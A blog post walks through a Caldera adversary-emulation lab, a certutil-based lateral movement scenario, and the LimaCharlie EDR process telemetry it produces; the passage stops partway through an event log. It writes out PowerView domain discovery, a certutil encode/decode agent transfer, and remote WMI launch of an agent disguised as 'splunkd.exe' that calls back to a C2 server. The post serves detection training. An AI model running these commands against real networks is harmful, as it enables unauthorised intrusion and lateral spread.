<!doctype html><html lang=en-us><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>[EN] Caldera Lateral Movement-Certutil Adversary Emulation | ittechnetworkk</title><link rel=canonical href=https://ittechnetworkk.github.io/posts/caldera_lateralmovementcertutil_attack_scenario/lateralmovementcertutil/><meta name=description content="Hi, I'm Soner, and this is my personal blog where I share insights, guides, and articles on various tech topics, including Networking, Linux, Windows, Virtualization, Firewalls, IoT, and more. I'm constantly learning and exploring new technologies, and this blog is where I document my journey. "><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://ittechnetworkk.github.io/posts/caldera_lateralmovementcertutil_attack_scenario/lateralmovementcertutil/"><meta property="og:site_name" content="ittechnetworkk"><meta property="og:title" content="[EN] Caldera Lateral Movement-Certutil Adversary Emulation"><meta property="og:description" content="Hi everyone, in this article I will perform an attack scenario using Caldera and show you its effects on victim machines using LimaCharlie as EDR.
I will use an adversary template called Lateral Movement - Certutil in Caldera which consists of three steps shown below.
Step 1: Local FQDN
Description: Uses Windows libraries to get the FQDN of the infected host Tactic: Discovery Technique Name: Host Discovery Technique ID: TA0007 Command:"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-02T16:32:09+02:00"><meta property="article:modified_time" content="2025-10-02T16:32:09+02:00"><meta property="article:tag" content="Soc"><meta property="article:tag" content="Caldera"><meta property="article:tag" content="Limacharlie"><meta property="article:tag" content="Mitre"><meta property="article:tag" content="Edr"><meta name=twitter:card content="summary"><meta name=twitter:title content="[EN] Caldera Lateral Movement-Certutil Adversary Emulation"><meta name=twitter:description content="Hi everyone, in this article I will perform an attack scenario using Caldera and show you its effects on victim machines using LimaCharlie as EDR.
I will use an adversary template called Lateral Movement - Certutil in Caldera which consists of three steps shown below.
Step 1: Local FQDN
Description: Uses Windows libraries to get the FQDN of the infected host Tactic: Discovery Technique Name: Host Discovery Technique ID: TA0007 Command:"><link rel=stylesheet href=https://ittechnetworkk.github.io/css/styles.bdd621ce0dc4beed42cba9d295fbb7a846b8870c3fda65b870471926d718c2543ebb5d8d248ba9a5554cba6ec2e05b0dc829190fd4e4fef576beaa4c3f244abe.css integrity="sha512-vdYhzg3Evu1Cy6nSlfu3qEa4hww/2mW4cEcZJtcYwlQ+u12NJIuppVVMum7C4FsNyCkZD9Tk/vV2vqpMPyRKvg=="><link rel=stylesheet href=https://ittechnetworkk.github.io/css/custom.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/lightbox.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/post-cards.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/posts-cards.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://ittechnetworkk.github.io/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/walkthroughs>Walkthroughs</a></li><li><a href=/projects>Projects</a></li><li><a href=/resources>Resources</a></li><li><a href=/library>Library</a></li><li><a href=/about>About</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://ittechnetworkk.github.io/posts/caldera_alice2.0_attack_scenario/calderaalice2.0/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=https://ittechnetworkk.github.io/posts/vmwareproxmoxlivemigrationautomatically/vmware-to-proxmox-migration-automatically/ aria-label=Next><i class="fas fa-chevron-right" aria-hidden=true onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&text=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&title=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&is_video=false&description=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation&body=Check out this article: https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&title=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&title=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&name=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation&description=%3cp%3eHi%20everyone%2c%20in%20this%20article%20I%20will%20perform%20an%20attack%20scenario%20using%20Caldera%20and%20show%20you%20its%20effects%20on%20victim%20machines%20using%20LimaCharlie%20as%20EDR.%3c%2fp%3e%0a%3cp%3eI%20will%20use%20an%20adversary%20template%20called%20%3cstrong%3eLateral%20Movement%20-%20Certutil%3c%2fstrong%3e%20in%20Caldera%20which%20consists%20of%20three%20steps%20shown%20below.%3c%2fp%3e%0a%3cp%3e%3cstrong%3eStep%201%3a%3c%2fstrong%3e%20Local%20FQDN%3c%2fp%3e%0a%3cpre%20tabindex%3d%220%22%3e%3ccode%3eDescription%3a%20Uses%20Windows%20libraries%20to%20get%20the%20FQDN%20of%20the%20infected%20host%0aTactic%3a%20Discovery%0aTechnique%20Name%3a%20Host%20Discovery%0aTechnique%20ID%3a%20TA0007%0a%3c%2fcode%3e%3c%2fpre%3e%3cp%3e%3cstrong%3eCommand%3a%3c%2fstrong%3e%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_lateralmovementcertutil_attack_scenario%2flateralmovementcertutil%2f&t=%5bEN%5d%20Caldera%20Lateral%20Movement-Certutil%20Adversary%20Emulation" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#step-1-local-fqdn><strong>Step 1: Local FQDN</strong></a></li><li><a href=#step-2-discover-local-hosts><strong>Step 2: Discover local hosts</strong></a></li><li><a href=#step-3-lateral-movement---certutil><strong>Step 3: Lateral Movement - Certutil</strong></a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">[EN] Caldera Lateral Movement-Certutil Adversary Emulation</h1><div class=meta><div class=author-info style=font-size:1.1em;margin-bottom:10px><span class=author itemprop=author itemscope itemtype=http://schema.org/Person><strong>Author:</strong> <span itemprop=name>Soner Sahin</span></span></div><div class=postdate><time datetime="2025-10-02 16:32:09 +0200 CEST" itemprop=datePublished>2025-10-02</time></div><div class=article-read-time><i class="far fa-clock"></i>
7 minute read</div><div class=article-category><i class="fas fa-archive"></i>
<a class=category-link href=/categories/soc>SOC</a></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=/tags/soc rel=tag>soc</a>
,
<a class=tag-link href=/tags/caldera rel=tag>caldera</a>
,
<a class=tag-link href=/tags/limacharlie rel=tag>limacharlie</a>
,
<a class=tag-link href=/tags/mitre rel=tag>mitre</a>
,
<a class=tag-link href=/tags/edr rel=tag>edr</a></div></div></header><div class=content itemprop=articleBody><p>Hi everyone, in this article I will perform an attack scenario using Caldera and show you its effects on victim machines using LimaCharlie as EDR.</p><p>I will use an adversary template called <strong>Lateral Movement - Certutil</strong> in Caldera which consists of three steps shown below.</p><p><strong>Step 1:</strong> Local FQDN</p><pre tabindex=0><code>Description: Uses Windows libraries to get the FQDN of the infected host
Tactic: Discovery
Technique Name: Host Discovery
Technique ID: TA0007
</code></pre><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>[System.Net.Dns]::GetHostByName(<span style=color:#8be9fd;font-style:italic>$env:computerName</span>).HostName
</span></span></code></pre></div><p><strong>Step 2:</strong> Discover local hosts</p><pre tabindex=0><code>Description: Use PowerView to query the Active Directory server for a list of computers in the Domain
Tactic: discovery
Technique Name: Remote System Discovery
Technique ID: T1018
</code></pre><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#8be9fd;font-style:italic>Import-Module</span> .\powerview.ps1;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span>
</span></span></code></pre></div><p><strong>Step 3:</strong> Lateral Movement - Certutil</p><pre tabindex=0><code>Description: Uses CertUtil as a LoL technique to move the .exe agent as a certificate using Windows-signed binaries
Tactic: Lateral Movement
Technique Name: Lateral Tool Transfer
Technique ID: T1570
</code></pre><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>certutil -encode <span style=color:#6272a4>#{location} C:\users\public\com.crt | out-null;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#8be9fd;font-style:italic>invoke-command</span> <span style=color:#6272a4>#{remote.host.fqdn} -scriptblock { certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist &#34;C:\users\public\splunkd.exe -server #{server} -group red&#34; }</span>
</span></span></code></pre></div><p>For those who don&rsquo;t know what <strong>certutil.exe</strong> is, it is a legitimate Windows command-line utility that comes built in to Windows operating systems. It is part of the Certificate Services suite and is primarily used for managing certificates and certificate authorities.</p><p>Even though <strong>certutil.exe</strong> is a legitimate Windows tool, it is also frequently abused by attackers for malicious purposes.</p><ul><li>Can download files from remote URLs (making it useful for malware delivery)</li><li>Can encode/decode malicious payloads to evade detection</li><li>Is signed by Microsoft, so it&rsquo;s often trusted by security software</li><li>Exists on most Windows systems by default</li></ul><p>For more details there is a great project named <a href=https://lolbas-project.github.io/><strong>Living Off The Land Binaries, Scripts and Libraries</strong> </a>. There you can find all of the legitimate Windows tools, detailed information—basically everything you need.</p><p>Let&rsquo;s get started.</p><p>Here is my lab environment:</p><ul><li>ad-dc 10.1.1.10</li><li>client1 10.1.2.10</li></ul><p>In the <strong>Operation</strong> tab, I will create a new operation as shown in the image below.</p><p><img src=/images/calderacertutil/1.png alt=certutil></p><p>To make things easier, I will measure the time to focus on the exact impacts.</p><p><strong>Timeline:</strong></p><p>Oct 02, 2025 @ 13:23:50 &mdash; Oct 02, 2025 @ 13:27:30</p><h2 id=step-1-local-fqdn><strong>Step 1: Local FQDN</strong></h2><pre tabindex=0><code>Tactic: Discovery
Technique Name: Host Discovery
Technique ID: TA0007
</code></pre><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvAHMAdABOAGEAbQBlAA==
</span></span></code></pre></div><p><strong>Decoded:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>[System.Net.Dns]::GetHostByName(<span style=color:#8be9fd;font-style:italic>$env:computerName</span>).HostName
</span></span></code></pre></div><p><strong>Command Output:</strong></p><pre tabindex=0><code>client1.ssnrshnn.local
</code></pre><p><strong>LimaCharlie:</strong></p><p>Here you can see the exact process that has been created by Caldera.</p><p><img src=/images/calderacertutil/2.png alt=certutil></p><p>The first process that is created by Caldera has <strong>5540</strong> PID and <strong>4272</strong> PPID.</p><p><img src=/images/calderacertutil/3.png alt=certutil></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:55050240
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>	&#34;</span>PARENT<span style=color:#f1fa8c>&#34;:{
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>		&#34;</span>BASE_ADDRESS<span style=color:#f1fa8c>&#34;:12845056
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>		&#34;</span>COMMAND_LINE<span style=color:#f1fa8c>&#34;:&#34;&#34;C:\Users\Public\Client1.exe&#34;</span> -server http://<span style=color:#bd93f9>10.1</span>.4.<span style=color:#bd93f9>40</span>:<span style=color:#bd93f9>8888</span> -group red <span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:0
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Users\Public\Client1.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>		&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>		&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:1306624
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>a76b164d14483ef2a0016dab68de5e69<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:9660
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>		&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>		&#34;</span>THIS_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>bbde0097323d5ef3b6dc604568de5e8c<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>		&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>		&#34;</span>TIMESTAMP<span style=color:#f1fa8c>&#34;:1759403660323
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>		&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:5540
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>}
</span></span></span></code></pre></div><p>Then that process created a child process with <strong>8360</strong> PID and <strong>5540</strong> PPID to proceed with its job.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvAHMAdABOAGEAbQBlAA==&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>31219712</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>	<span style=color:#f1fa8c>&#34;PARENT&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>		<span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>		<span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>		&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>		&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:55050240
